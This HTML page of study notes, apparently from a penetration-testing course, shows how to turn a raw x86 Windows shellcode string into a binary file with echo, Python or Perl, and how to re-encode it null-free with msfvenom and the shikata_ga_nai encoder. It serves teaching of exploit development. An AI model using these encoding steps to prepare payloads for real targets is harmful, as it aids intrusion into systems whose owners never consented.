<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>msfvenom encoding</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>msfvenom encoding</h1><br/><strong><h2>msfvenom</h2></strong><br />The main purpose of msfvenom is to generate shellcodes(encoded or not) based on Metasploit payloads, but we can also use it to encode our custom payloads.<br />    <br /><strong>To encode the Shellcode and remove these NULL bytes and make it NULL-free we have to do the following steps:</strong><br /><br /><span style="color:#a5452a;">example of Shellcode:</span><br />    <code>“\x68\x63\x6d\x64\x00\x8B\xDC\x6A\x00\x68\x6f\x70\x65\x6e\x8B\xCC\x6A\x03\x33\xC0\x50\x50\x53\x51\x50\xB8\x78\x70\x30\x76\xff\xD0”</code><br />    <br />1. Convert the Shellcode in a binary file(we have different options):<br />   ◇ <strong>echo command</strong>:<br />       <div class="codebox"><div class="codebox">echo&nbsp;-ne&nbsp;&quot;x68\x63\x6d…&quot;&nbsp;&gt;&nbsp;binshellcode.bin</div></div><br />       <code>-n</code> → used to not output the trailing newline<br />       <code>-e</code> → enables interpretation of backslash escapes<br />       <code>&gt;</code> binshellcode.bin → outputs the result into the file binshellcode.bin<br />   ◇ <strong>Python</strong>(we have to delete manually the new line character at the end of the file):<br />       <div class="codebox"><div class="codebox">python&nbsp;-c&nbsp;&#39;print&nbsp;&quot;\x68\x63\x6d…&quot;&#39;&nbsp;&gt;&nbsp;binshellcodepython.bin</div></div><br />       <code>-c</code> → execute commands between quotation marks  &#39;...&#39;<br />   Python <span style="text-decoration:underline;">print</span> function adds a <span style="color:#f6ff00;">new line character(\n)</span> that in hexadecimal is <strong><span style="color:#f6ff00;">000a</span></strong> at the end of the file, because we do not want it we have to remove it manually or use another script like the following one that use <span style="text-decoration:underline;">write</span> instead of print<br />   <a href=""><img src="images/538-1.png" alt="images/538-1.png" /></a><br />   ◇ <strong>Python</strong>:<br />       use of function write instead of print<br />       <div class="codebox"><div class="codebox">python&nbsp;&lt;&lt;EOP<br />shellcode&nbsp;=&quot;x68\x63\x6d…&quot;<br />binshellcodefile&nbsp;=&nbsp;open(&#39;binshellcodepython2.bin&#39;,&#39;w&#39;)<br />binshellcodefile.write(shellcode)<br />binshellcodefile.close()<br />EOP</div></div><br />   ◇ <strong>Perl</strong>:<br />       <div class="codebox"><div class="codebox">perl&nbsp;-e&nbsp;&#39;&nbsp;print&nbsp;&quot;\x68\x63\x6d…&quot;&#39;&nbsp;&gt;&nbsp;binshellcodeperl.bin</div></div><br />       <code>-e</code> → execute commands between quotation marks  &#39;...&#39;<br /><br />2. Inspect binary of the Shellcode with hexdump(OPTIONAL)<br />    <div class="codebox"><div class="codebox">hexdump&nbsp;binshellcode.bin</div></div><br />    <a href=""><img src="images/538-2.png" alt="images/538-2.png" /></a><br /><br />3. Use <strong>msfvenom</strong> to encode the binary version of the Shellcode into a NULL-free version<br />    <div class="codebox"><div class="codebox">cat&nbsp;binshellcode.bin&nbsp;|&nbsp;msfvenom&nbsp;-p&nbsp;-&nbsp;-a&nbsp;x86&nbsp;--platform&nbsp;windows&nbsp;-e&nbsp;x86/shikata_ga_nai&nbsp;-f&nbsp;c&nbsp;-b&nbsp;&#39;\x00&#39;</div></div><br />    <code>-b</code> →  this option is used to specify a list of (bad) characters to avoid when generating the shellcode. Since we want a null free shellcode, we will instruct msfvenom to avoid &#39;\x00 &#39;<br />    <code>-a</code> →  specifies the architecture to use, in our case x86<br />    <code>-p</code> → specify the payload to use; in our case <strong>-</strong> instructs msfvenom to read the custom payload from stdin, because we have piped with (|) the cat command to redirect our shellcode into it<br />    <code>--platform</code> →  is used to specify the platform(e.g.: linux, windows, osx, cisco, android...)<br />    <code>-e</code> →  specifies the encoder to use (e.g.: x86/shikata_ga_nai)<br />    <code>-f</code> →  sets the output format, in our case C<br />    <a href="file://C:/CherryTree/screenshots2/PTP-elearnsecurity/1. System Security/4 - Shellcoding/msfvenom-NULL-free.png"><img src="images/538-3.png" alt="images/538-3.png" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div>
</body>
</html>
